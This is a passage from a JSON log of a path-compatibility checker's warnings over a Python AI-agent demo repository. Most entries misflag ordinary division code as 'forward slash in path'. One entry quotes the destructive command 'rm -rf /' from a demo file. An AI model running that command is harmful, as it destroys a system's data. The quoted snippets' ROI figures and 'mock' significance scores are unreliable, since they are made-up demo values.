        "warning": "Line 453: Forward slash in path - \"\n        \n        # Estimate manual processing time (baseline)\n        manual_processing_time_minutes = 15  # Average 15 minutes manual processing\n        automated_processing_time_minutes = processing_time_ms / 60000\n        \n        time_saved_minutes = manual_processing_time_minutes - automated_processing_time_minutes\n        time_saved_hours = time_saved_minutes / 60\n        \n        # Calculate cost savings (assuming $25/hour for manual processing)\n        hourly_rate = 25.0\n        cost_savings = time_saved_hours * hourly_rate\n        \n        # Calculate accuracy improvement (estimated)\n        manual_accuracy = 0.92  # Typical manual processing accuracy\n        automated_accuracy = validated_result['",
        "timestamp": "2025-09-05T17:30:42.169746"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 475: Forward slash in path - ': round((time_saved_minutes / manual_processing_time_minutes) * 100, 1),\n            '",
        "timestamp": "2025-09-05T17:30:42.169777"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 477: Forward slash in path - ': round(manual_processing_time_minutes / 60 * hourly_rate, 2),\n                '",
        "timestamp": "2025-09-05T17:30:42.169801"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 478: Forward slash in path - ': round(processing_time_ms / 60000 / 60 * hourly_rate + 0.01, 2),  # Include AI costs\n                '",
        "timestamp": "2025-09-05T17:30:42.169824"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 539: Forward slash in path - ']) / max(len(metrics['",
        "timestamp": "2025-09-05T17:30:42.169890"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 540: Forward slash in path - ']) / max(len(metrics['",
        "timestamp": "2025-09-05T17:30:42.169917"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 559: Forward slash in path - '] * 60 * 60000 / max(sum(metrics['",
        "timestamp": "2025-09-05T17:30:42.169956"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 560: Forward slash in path - '] / max(metrics['",
        "timestamp": "2025-09-05T17:30:42.169984"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 578: Forward slash in path - \"demo_documents/invoice_001.pdf\"",
        "timestamp": "2025-09-05T17:30:42.170019"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 590: Forward slash in path - \"demo_documents/purchase_order_002.pdf\"",
        "timestamp": "2025-09-05T17:30:42.170053"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 597: Forward slash in path - \"demo_documents/contract_003.pdf\"",
        "timestamp": "2025-09-05T17:30:42.170109"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 653: Forward slash in path - \"⏱️  Total Time Saved: {total_time_saved:.0f} minutes ({total_time_saved/60:.1f} hours)\"",
        "timestamp": "2025-09-05T17:30:42.170173"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 654: Forward slash in path - \"🎯 Efficiency Improvement: {(total_time_saved / (len(results) * 15)) * 100:.0f}%\"",
        "timestamp": "2025-09-05T17:30:42.170201"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "warning": "Line 656: Forward slash in path - \"📈 ROI for Demo Batch: {((total_savings - sum(r.cost_estimate for r in results)) / max(sum(r.cost_estimate for r in results), 0.01)) * 100:.0f}%\"",
        "timestamp": "2025-09-05T17:30:42.170231"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_autonomous_demo.py",
        "warning": "Line 295: Forward slash in path - 'rm -rf /'",
        "timestamp": "2025-09-05T17:30:42.170747"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_autonomous_demo.py",
        "warning": "Line 374: Forward slash in path - \"  Throughput: {len(coordination_results) / coordination_time:.2f} tasks/second\"",
        "timestamp": "2025-09-05T17:30:42.170802"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_autonomous_demo.py",
        "warning": "Line 393: Forward slash in path - \"  Discovery rate: {len(capabilities) / max(discovery_time, 0.1):.2f} capabilities/second\"",
        "timestamp": "2025-09-05T17:30:42.170823"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_autonomous_demo.py",
        "warning": "Line 404: Forward slash in path - \"  Average per agent: {total_memory_usage / len(agents):.1f}\"",
        "timestamp": "2025-09-05T17:30:42.170840"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Line 134: Forward slash in path - \" in task_text.lower():\n            complexity_indicators += 1\n        \n        return min(1.0, complexity_indicators / 5.0)\n\n\nclass Phase7CompleteEcosystemDemo:\n    \"",
        "timestamp": "2025-09-05T17:30:42.171477"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Line 342: Forward slash in path - '])}/10\"",
        "timestamp": "2025-09-05T17:30:42.171624"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Line 689: Forward slash in path - \")\n        \n        average_accuracy = total_accuracy / len(reasoning_tasks) if reasoning_tasks else 0.0\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.171857"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Line 750: Forward slash in path - \"]])\n        success_rate = successful_tasks / len(execution_results) if execution_results else 0.0\n        avg_processing_time = total_processing_time / len(execution_results) if execution_results else 0.0\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.171921"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Line 857: Forward slash in path - \"]])\n        avg_cost_reduction = (total_cost_savings / total_business_value * 100) if total_business_value > 0 else 0\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.172010"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Line 865: Forward slash in path - \": avg_cost_reduction / 100,\n            \"",
        "timestamp": "2025-09-05T17:30:42.172041"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Line 897: Forward slash in path - \"        Cycle {cycle + 1}/{evolution_cycles}...\"",
        "timestamp": "2025-09-05T17:30:42.172084"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "warning": "Line 942: Forward slash in path - \"]\n            \n            target_achievement = (current_roi / 1941.0) * 100\n            \n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.172141"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Line 125: Forward slash in path - ']:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.172762"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Line 295: Forward slash in path - 'Security framework audit completed. Score: {security_score:.1f}/100'",
        "timestamp": "2025-09-05T17:30:42.172869"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Line 410: Forward slash in path - \"Success Rate: {len(successful_demos)/len(self.demo_results):.1%}\"",
        "timestamp": "2025-09-05T17:30:42.172952"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Line 434: Forward slash in path - \")\n            return\n        \n        # Aggregate metrics\n        total_demos = len(self.demo_results)\n        avg_execution_time = sum(r.execution_time for r in self.demo_results.values()) / total_demos\n        success_rate = len([r for r in self.demo_results.values() if r.success]) / total_demos\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.172982"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Line 497: Forward slash in path - \", 83)\n        ]\n        \n        for name, score in capabilities:\n            bar_length = 20\n            filled_length = int(bar_length * score // 100)\n            bar = \"",
        "timestamp": "2025-09-05T17:30:42.173036"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_meta_demo.py",
        "warning": "Line 589: Forward slash in path - \")\n        \n        if self.demo_results:\n            success_count = len([r for r in self.demo_results.values() if r.success])\n            success_rate = success_count / len(self.demo_results)\n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.173119"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\run_phase7_demo_simple.py",
        "warning": "Line 37: Forward slash in path - ']:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.173432"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\run_phase7_demo_simple.py",
        "warning": "Line 125: Forward slash in path - \"Success Rate: {successful_demos/len(components):.1%}\"",
        "timestamp": "2025-09-05T17:30:42.173528"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\run_phase7_demo_simple.py",
        "warning": "Line 203: Forward slash in path - 'Security framework audit completed. Score: {security_score:.1f}/100, Critical Issues: {critical_issues}'",
        "timestamp": "2025-09-05T17:30:42.173576"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\run_phase7_demo_simple.py",
        "warning": "Line 205: Forward slash in path - ': security_score / 100,\n                '",
        "timestamp": "2025-09-05T17:30:42.173585"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "warning": "Line 260: Forward slash in path - \"\n        interactions = []\n        \n        # Random pairwise interactions\n        num_interactions = min(50, len(population) // 2)\n        \n        for _ in range(num_interactions):\n            agent1, agent2 = np.random.choice(population, size=2, replace=False)\n            \n            interaction = await self._simulate_agent_interaction(agent1, agent2, cycle)\n            interactions.append(interaction)\n        \n        return interactions\n    \n    async def _simulate_agent_interaction(self, agent1: Dict, agent2: Dict, cycle: int) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.174096"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "warning": "Line 487: Forward slash in path - \"C:/Users/Nouri/Documents/GitHub/ai-agents/reports/phase7_assessment.json\"",
        "timestamp": "2025-09-05T17:30:42.174231"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "warning": "Line 522: Forward slash in path - \"\n        baseline_score = await self.measure_baseline(capability_name)\n        enhanced_score = await self.test_enhanced_capability(capability_name)\n        \n        improvement_percentage = ((enhanced_score - baseline_score) / baseline_score) * 100\n        statistical_significance = await self.calculate_significance(baseline_score, enhanced_score)\n        breakthrough_indicators = await self.detect_breakthroughs(capability_name, enhanced_score)\n        \n        return TestResults(\n            capability=capability_name,\n            test_type=self.get_test_type(),\n            baseline_score=baseline_score,\n            enhanced_score=enhanced_score,\n            improvement_percentage=improvement_percentage,\n            statistical_significance=statistical_significance,\n            breakthrough_indicators=breakthrough_indicators\n        )\n    \n    async def measure_baseline(self, capability_name: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.174277"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "warning": "Line 553: Forward slash in path - \"\n        # Mock statistical significance calculation\n        return min(0.99, abs(enhanced - baseline) / baseline * 10)\n    \n    async def detect_breakthroughs(self, capability_name: str, score: float) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.174301"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 50: Forward slash in path - \"\n    investment_cost: float\n    annual_savings: float\n    productivity_gains: float\n    risk_reduction_value: float\n    innovation_value: float\n    \n    total_annual_benefit: float = field(init=False)\n    roi_percentage: float = field(init=False)\n    payback_period_months: float = field(init=False)\n    net_present_value: float = field(init=False)\n    \n    def __post_init__(self):\n        self.total_annual_benefit = (\n            self.annual_savings + \n            self.productivity_gains + \n            self.risk_reduction_value + \n            self.innovation_value\n        )\n        \n        if self.investment_cost > 0:\n            self.roi_percentage = ((self.total_annual_benefit - self.investment_cost) / self.investment_cost) * 100\n            self.payback_period_months = (self.investment_cost / self.total_annual_benefit) * 12\n        else:\n            self.roi_percentage = float('",
        "timestamp": "2025-09-05T17:30:42.174833"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 74: Forward slash in path - ')\n            self.payback_period_months = 0\n        \n        # NPV calculation (5 year projection, 10% discount rate)\n        discount_rate = 0.10\n        self.net_present_value = sum(\n            self.total_annual_benefit / ((1 + discount_rate) ** year) \n            for year in range(1, 6)\n        ) - self.investment_cost\n\n\n@dataclass\nclass BusinessScenario:\n    \"",
        "timestamp": "2025-09-05T17:30:42.174846"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 261: Forward slash in path - \", 4.2)\n        speed_improvement = ((speed_before - speed_after) / speed_before) * 100\n        \n        metrics.append(BusinessMetric(\n            name=\"",
        "timestamp": "2025-09-05T17:30:42.174953"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 265: Forward slash in path - \",\n            current_value=speed_before / speed_after,\n            baseline_value=1.0,\n            improvement_percentage=speed_improvement,\n            unit=\"",
        "timestamp": "2025-09-05T17:30:42.174965"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 277: Forward slash in path - \", 200000)\n        cost_reduction = ((cost_before - cost_after) / cost_before) * 100\n        \n        metrics.append(BusinessMetric(\n            name=\"",
        "timestamp": "2025-09-05T17:30:42.174982"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 297: Forward slash in path - \",\n            current_value=accuracy_after,\n            baseline_value=accuracy_before,\n            improvement_percentage=accuracy_improvement / accuracy_before * 100,\n            unit=\"",
        "timestamp": "2025-09-05T17:30:42.175003"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 329: Forward slash in path - \",\n            current_value=satisfaction_after,\n            baseline_value=satisfaction_before,\n            improvement_percentage=satisfaction_improvement / satisfaction_before * 100,\n            unit=\"",
        "timestamp": "2025-09-05T17:30:42.175033"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 441: Forward slash in path - \"] for r in risk_factors)\n        risk_reduction = (total_risk_score - residual_risk_score) / total_risk_score * 100\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.175119"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 471: Forward slash in path - \": base_roi.roi_percentage / benchmarks[\"",
        "timestamp": "2025-09-05T17:30:42.175157"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 472: Forward slash in path - \"] - base_roi.payback_period_months) / benchmarks[\"",
        "timestamp": "2025-09-05T17:30:42.175174"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 540: Forward slash in path - \", 95.0) / 85.0  # Baseline 85%\n        automation_factor = after_metrics.get(\"",
        "timestamp": "2025-09-05T17:30:42.175235"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 541: Forward slash in path - \", 92.0) / 50.0  # Baseline 50%\n        \n        return processing_improvement * 0.4 + accuracy_factor * 0.3 + automation_factor * 0.3\n    \n    def _calculate_risk_reduction_value(self, scenario: BusinessScenario) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.175257"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 566: Forward slash in path - \":\n            modified_cost = base_roi.investment_cost * (1 + change / 100)\n            return ((base_roi.total_annual_benefit - modified_cost) / modified_cost) * 100\n        elif variable == \"",
        "timestamp": "2025-09-05T17:30:42.175294"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 569: Forward slash in path - \":\n            modified_benefit = base_roi.total_annual_benefit * (change / 100)\n            return ((modified_benefit - base_roi.investment_cost) / base_roi.investment_cost) * 100\n        else:\n            # Simplified calculation for other variables\n            return base_roi.roi_percentage * (1 + change / 100)\n    \n    # Visualization data generation methods\n    \n    async def _generate_roi_dashboard_data(self, roi: ROICalculation) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.175317"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 634: Forward slash in path - \"\n    Business Transformation Demonstration\n    \n    Showcases end-to-end business transformation scenarios with\n    compelling before/after comparisons and real-world impact examples.\n    \"",
        "timestamp": "2025-09-05T17:30:42.175368"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\business_impact.py",
        "warning": "Line 714: Forward slash in path - \")\n        \n        # Calculate comprehensive ROI\n        roi_analysis = await self.roi_calculator.calculate_comprehensive_roi(scenario)\n        \n        # Generate transformation timeline\n        transformation_timeline = self._generate_transformation_timeline(scenario)\n        \n        # Create before/after comparison\n        before_after_comparison = self._create_before_after_comparison(scenario)\n        \n        # Generate success stories\n        success_stories = self._generate_success_stories(scenario)\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.175437"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 207: Forward slash in path - \"\n        \n        # Distribution of agent types\n        coordinator_count = max(1, self.num_agents // 20)  # 5% coordinators\n        specialist_count = max(5, self.num_agents // 5)    # 20% specialists  \n        worker_count = self.num_agents - coordinator_count - specialist_count  # 75% workers\n        \n        agent_id = 0\n        \n        # Create coordinators\n        for i in range(coordinator_count):\n            capabilities = [\n                \"",
        "timestamp": "2025-09-05T17:30:42.176038"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 292: Forward slash in path - \"\n        # Distance factor\n        dist = math.sqrt((agent1.position[0] - agent2.position[0])**2 + \n                        (agent1.position[1] - agent2.position[1])**2)\n        distance_factor = max(0, 1 - dist / 100)\n        \n        # Capability overlap factor\n        common_capabilities = set(agent1.capabilities) & set(agent2.capabilities)\n        capability_factor = len(common_capabilities) / max(len(agent1.capabilities), 1)\n        \n        # Type-based connection preferences\n        type_factor = 0.5\n        if agent1.agent_type == AgentType.COORDINATOR:\n            type_factor = 0.8  # Coordinators connect more\n        elif agent1.agent_type == agent2.agent_type:\n            type_factor = 0.6  # Same types prefer to connect\n        \n        return min(1.0, (distance_factor * 0.3 + capability_factor * 0.4 + type_factor * 0.3))\n    \n    async def _initialize_coordination_patterns(self) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.176108"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 345: Forward slash in path - \": task.complexity / subtask_count,\n                    \"",
        "timestamp": "2025-09-05T17:30:42.176146"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 347: Forward slash in path - \": task.estimated_duration / subtask_count\n                }\n                task.decomposed_subtasks.append(subtask)\n            \n            tasks.append(task)\n        \n        # Create cross-department integration tasks\n        integration_task = SwarmTask(\n            task_id=\"",
        "timestamp": "2025-09-05T17:30:42.176164"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 370: Forward slash in path - \": integration_task.complexity / (len(departments) * (len(departments)-1) / 2),\n                    \"",
        "timestamp": "2025-09-05T17:30:42.176188"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 422: Forward slash in path - \"\n        suitable = []\n        \n        for agent_id, agent in self.agents.items():\n            # Check capability match\n            capability_overlap = set(task.required_capabilities) & set(agent.capabilities)\n            capability_score = len(capability_overlap) / len(task.required_capabilities)\n            \n            # Check availability (task load)\n            availability_score = max(0, 1 - agent.task_load)\n            \n            # Check performance score\n            performance_factor = agent.performance_score / 100\n            \n            # Overall suitability score\n            suitability = (capability_score * 0.4 + availability_score * 0.3 + performance_factor * 0.3)\n            \n            if suitability > 0.5:  # Threshold for suitability\n                suitable.append((agent_id, suitability))\n        \n        # Sort by suitability and return agent IDs\n        suitable.sort(key=lambda x: x[1], reverse=True)\n        return [agent_id for agent_id, score in suitable[:20]]  # Top 20 suitable agents\n    \n    async def _swarm_assignment(self, task: SwarmTask, suitable_agents: List[str]) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.176247"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 447: Forward slash in path - \"\n        required_agents = min(len(suitable_agents), random.randint(3, 8))\n        \n        # Swarm-based selection considering local interactions\n        selected = []\n        available_agents = suitable_agents.copy()\n        \n        while len(selected) < required_agents and available_agents:\n            if not selected:\n                # First agent: select best performer\n                best_agent = max(available_agents, \n                               key=lambda aid: self.agents[aid].performance_score)\n                selected.append(best_agent)\n                available_agents.remove(best_agent)\n            else:\n                # Subsequent agents: select based on network connections and performance\n                scores = {}\n                for candidate in available_agents:\n                    # Connection score with already selected agents\n                    connection_score = sum(1 for selected_agent in selected \n                                         if candidate in self.agents[selected_agent].connections)\n                    \n                    # Performance score\n                    performance_score = self.agents[candidate].performance_score / 100\n                    \n                    # Cooperation score\n                    cooperation_score = self.agents[candidate].cooperation_score\n                    \n                    scores[candidate] = (connection_score * 0.4 + \n                                       performance_score * 0.3 + \n                                       cooperation_score * 0.3)\n                \n                if scores:\n                    best_candidate = max(scores.keys(), key=lambda x: scores[x])\n                    selected.append(best_candidate)\n                    available_agents.remove(best_candidate)\n                else:\n                    break\n        \n        return selected\n    \n    async def _execute_coordinated_tasks(self, tasks: List[SwarmTask]) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.176284"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 504: Forward slash in path - \", 0) for result in execution_results if isinstance(result, dict)) / len(execution_results)\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.176313"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 509: Forward slash in path - \": successful_tasks / len(tasks) * 100,\n            \"",
        "timestamp": "2025-09-05T17:30:42.176331"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 521: Forward slash in path - \"\n        \n        # Simulate task execution with realistic timing\n        base_time = task.estimated_duration\n        actual_time = base_time * random.uniform(0.8, 1.3)  # ±30% variance\n        \n        # Progressive task completion\n        completion_steps = 10\n        for step in range(completion_steps):\n            await asyncio.sleep(actual_time / completion_steps / 10)  # Speed up for demo\n            task.progress = (step + 1) / completion_steps\n            \n            # Log coordination communications\n            if random.random() < 0.3:  # 30% chance of communication per step\n                self._log_agent_communication(task, step)\n        \n        # Calculate task success based on agent performance\n        success_probability = self._calculate_task_success_probability(task)\n        success = random.random() < success_probability\n        \n        task.status = \"",
        "timestamp": "2025-09-05T17:30:42.176376"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 549: Forward slash in path - \": task.estimated_duration / execution_time if execution_time > 0 else 1.0,\n            \"",
        "timestamp": "2025-09-05T17:30:42.176400"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 581: Forward slash in path - \": len(emergent_behaviors) / max(len(self.agents), 1),\n            \"",
        "timestamp": "2025-09-05T17:30:42.176441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 636: Forward slash in path - \"\n        if not self.agents:\n            return 0.0\n        \n        total_possible_connections = len(self.agents) * (len(self.agents) - 1)\n        actual_connections = sum(len(agent.connections) for agent in self.agents.values())\n        \n        return actual_connections / total_possible_connections if total_possible_connections > 0 else 0.0\n    \n    def _generate_swarm_animation_data(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.176496"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\coordination.py",
        "warning": "Line 728: Forward slash in path - \"\n        if not task.assigned_agents:\n            return 0.0\n        \n        agent_performances = [self.agents[aid].performance_score for aid in task.assigned_agents]\n        average_performance = sum(agent_performances) / len(agent_performances)\n        \n        # Success probability based on performance and task complexity\n        base_probability = average_performance / 100\n        complexity_factor = max(0.1, 1 - (task.complexity / 10))\n        \n        return min(0.98, base_probability * complexity_factor)\n    \n    def _detect_coordination_patterns(self) -> List[Dict[str, Any]]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.176712"
